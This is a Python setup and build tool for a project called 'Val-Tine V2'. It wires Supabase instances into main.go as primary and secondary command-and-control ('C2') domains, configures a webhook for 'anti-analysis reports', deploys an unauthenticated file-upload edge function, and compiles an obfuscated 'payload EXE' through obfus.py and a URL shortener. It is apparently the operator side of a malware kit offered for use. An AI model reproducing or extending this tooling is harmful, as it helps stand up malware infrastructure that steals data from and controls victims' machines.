#!/usr/bin/env python3
"""
Val-Tine V2 — Setup & Build Tool

Interactive CLI to:
1. Configure Supabase credentials (URL, anon key)
2. Apply SQL migrations via Supabase Management API
3. Deploy edge functions
4. Update all config files (main.go, .env, obfus.py)
5. Build the payload using obfus.py
"""
import sys
import os
import re
import json
import subprocess
import getpass

# ============================================================
# HELPERS
# ============================================================

def log(msg, level="INFO"):
    prefix = {"INFO": "[*]", "OK": "[+]", "ERR": "[-]", "WARN": "[!]", "ASK": "[?]"}[level]
    print(f"{prefix} {msg}")


def ask(prompt, default=None, secret=False):
    """Prompt user for input with optional default."""
    suffix = f" [{default}]" if default else ""
    full = f"[?] {prompt}{suffix}: "
    if secret:
        val = getpass.getpass(full)
    else:
        val = input(full)
    return val.strip() or default


def ask_yn(prompt, default=True):
    """Ask yes/no question."""
    choices = "Y/n" if default else "y/N"
    val = input(f"[?] {prompt} [{choices}]: ").strip().lower()
    if not val:
        return default
    return val in ("y", "yes")


def run(cmd, **kwargs):
    """Run subprocess, return (success, stdout, stderr)."""
    r = subprocess.run(cmd, capture_output=True, text=True, **kwargs)
    return r.returncode == 0, r.stdout.strip(), r.stderr.strip()


def check_tool(name):
    """Check if a CLI tool is available."""
    ok, out, _ = run(["which", name])
    return ok


def replace_in_file(filepath, old, new):
    """Replace exact string in file."""
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()
    if old not in content:
        log(f"Warning: pattern not found in {filepath}", "WARN")
        return False
    content = content.replace(old, new)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content)
    return True


# ============================================================
# CONFIG COLLECTION
# ============================================================

def collect_config():
    """Collect all config values from user."""
    print()
    print("=" * 55)
    print("  Val-Tine V2 — Setup & Build")
    print("=" * 55)
    print()

    cfg = {}

    # --- Primary Supabase project ---
    log("Primary Supabase project (required)")
    cfg["supa_url"] = ask("Supabase project URL", "https://xxxxx.supabase.co")
    cfg["supa_anon_key"] = ask("Supabase anon/public key")

    # --- Secondary Supabase project (optional redundancy) ---
    print()
    if ask_yn("Add a secondary Supabase project for redundancy?", default=False):
        cfg["supa_url2"] = ask("Secondary Supabase URL", "https://xxxxx.supabase.co")
        cfg["supa_anon_key2"] = ask("Secondary anon key")
    else:
        cfg["supa_url2"] = ""
        cfg["supa_anon_key2"] = ""

    # --- Webhook (anti-analysis reporting) ---
    print()
    cfg["webhook_url"] = ask(
        "Webhook URL for anti-analysis reports (leave blank to disable)",
        default=""
    )

    # --- URL shortener Supabase function ---
    print()
    log("URL shortener (used by obfus.py build pipeline)")
    cfg["shortener_supa_url"] = ask(
        "Shortener Supabase URL (or same as primary)",
        default=cfg["supa_url"]
    )
    cfg["shortener_api_key"] = ask(
        "Shortener API key",
        default="listentosmokeforever"
    )

    # --- Supabase CLI login for migrations ---
    print()
    cfg["run_migrations"] = ask_yn("Run SQL migrations via Supabase CLI?", default=True)
    if cfg["run_migrations"]:
        cfg["supa_project_ref"] = ask("Supabase project ref (from dashboard URL)")
        cfg["supa_db_password"] = ask("Database password", secret=True)

    # --- Build ---
    print()
    cfg["build_payload"] = ask_yn("Build payload EXE after setup?", default=True)

    return cfg


# ============================================================
# APPLY CONFIGURATION TO FILES
# ============================================================

def apply_config(cfg):
    """Write config values into all project files."""
    root = os.path.dirname(os.path.abspath(__file__))
    main_go = os.path.join(root, "main.go")
    env_file = os.path.join(root, ".env")
    obfus_file = os.path.join(root, "obfus.py")

    log("Applying configuration to project files...")

    # --- main.go: primary C2 domain ---
    replace_in_file(main_go,
        'URL:      "https://supbaseurl.supabase.co"',
        f'URL:      "{cfg["supa_url"]}"')
    replace_in_file(main_go,
        'APIKey:   "dahkeygoesinhere"',
        f'APIKey:   "{cfg["supa_anon_key"]}"')

    # --- main.go: secondary C2 domain ---
    if cfg["supa_url2"]:
        replace_in_file(main_go,
            'URL:      "https://secondsupabaseurlforredundancy.supabase.co"',
            f'URL:      "{cfg["supa_url2"]}"')
        replace_in_file(main_go,
            'APIKey:   "daothakeygoeshere"',
            f'APIKey:   "{cfg["supa_anon_key2"]}"')

    # --- main.go: webhook URL ---
    if cfg["webhook_url"]:
        replace_in_file(main_go,
            'https://webhook.site/0a0aea37-6d21-47b2-844f-30db3cee67e3',
            cfg["webhook_url"])
    else:
        # Comment out the webhook POST
        with open(main_go, "r", encoding="utf-8") as f:
            content = f.read()
        content = content.replace(
            '\t\thttp.Post("https://webhook.site/0a0aea37-6d21-47b2-844f-30db3cee67e3", "application/json", bytes.NewReader(payload))',
            '\t\t// http.Post disabled — no webhook configured'
        )
        with open(main_go, "w", encoding="utf-8") as f:
            f.write(content)

    # --- .env: web dashboard ---
    with open(env_file, "w", encoding="utf-8") as f:
        f.write(f'VITE_SUPABASE_URL="{cfg["supa_url"]}"\n')
        f.write(f'VITE_SUPABASE_PUBLISHABLE_KEY="{cfg["supa_anon_key"]}"\n')
    log(f"Updated {env_file}", "OK")

    # --- obfus.py: URL shortener config ---
    # Extract project ref from shortener URL for the edge function URL
    shortener_ref = cfg["shortener_supa_url"].replace("https://", "").replace(".supabase.co", "")
    shortener_fn_url = f"https://{shortener_ref}.supabase.co/functions/v1/shorten"
    replace_in_file(obfus_file,
        'https://edgqrfijgnyboeymkydu.supabase.co/functions/v1/shorten',
        shortener_fn_url)
    replace_in_file(obfus_file,
        '"x-api-key": "listentosmokeforever"',
        f'"x-api-key": "{cfg["shortener_api_key"]}"')

    log("All config files updated", "OK")


# ============================================================
# SUPABASE MIGRATIONS
# ============================================================

def run_migrations(cfg):
    """Run SQL migrations using Supabase CLI."""
    root = os.path.dirname(os.path.abspath(__file__))

    if not check_tool("supabase"):
        log("Supabase CLI not found. Install: https://supabase.com/docs/guides/cli", "ERR")
        log("You can manually run the SQL files in supabase/migrations/ via the Supabase dashboard SQL editor.", "WARN")
        return False

    project_ref = cfg["supa_project_ref"]
    db_pass = cfg["supa_db_password"]

    # Link project
    log("Linking Supabase project...")
    ok, out, err = run(
        ["supabase", "link", "--project-ref", project_ref, f"--password={db_pass}"],
        cwd=root
    )
    if not ok:
        log(f"supabase link failed: {err}", "ERR")
        log("Trying to push migrations anyway...", "WARN")

    # Push migrations
    log("Pushing database migrations...")
    ok, out, err = run(
        ["supabase", "db", "push", f"--password={db_pass}"],
        cwd=root
    )
    if ok:
        log("Database migrations applied", "OK")
    else:
        log(f"Migration push failed: {err}", "ERR")
        log("Run the SQL files manually via Supabase dashboard SQL editor.", "WARN")
        return False

    # Deploy edge functions
    log("Deploying edge functions...")
    ok, out, err = run(
        ["supabase", "functions", "deploy", "file-upload", "--no-verify-jwt"],
        cwd=root
    )
    if ok:
        log("Edge function 'file-upload' deployed", "OK")
    else:
        log(f"Edge function deploy failed: {err}", "WARN")
        log("Deploy manually: supabase functions deploy file-upload --no-verify-jwt", "WARN")

    return True


# ============================================================
# BUILD PAYLOAD
# ============================================================

def build_payload():
    """Run obfus.py to build the payload."""
    root = os.path.dirname(os.path.abspath(__file__))

    # Check Go is installed
    if not check_tool("go"):
        log("Go compiler not found. Install from https://go.dev/dl/", "ERR")
        return False

    log("Starting payload build...")
    print()
    result = subprocess.run(
        [sys.executable, os.path.join(root, "obfus.py")],
        cwd=root
    )
    return result.returncode == 0


# ============================================================
# MAIN
# ============================================================

def main():
    # Quick mode: just build without setup
    if len(sys.argv) > 1 and sys.argv[1] == "build":
        log("Build-only mode")
        if build_payload():
            log("Build complete", "OK")
        else:
            log("Build failed", "ERR")
            sys.exit(1)
        return

    # Full setup
    cfg = collect_config()

    print()
    log("=" * 50)
    log("Applying configuration...")
    apply_config(cfg)

    if cfg["run_migrations"]:
        print()
        log("Running Supabase migrations...")
        run_migrations(cfg)

    if cfg["build_payload"]:
        print()
        build_payload()

    print()
    print("=" * 55)
    log("Setup complete!", "OK")
    print()
    log("Next steps:")
    log("  1. Start the web dashboard:  npm run dev")
    log("  2. The built EXE is in the current directory")
    log("  3. To rebuild later:  python3 setup.py build")
    print()


if __name__ == "__main__":
    main()
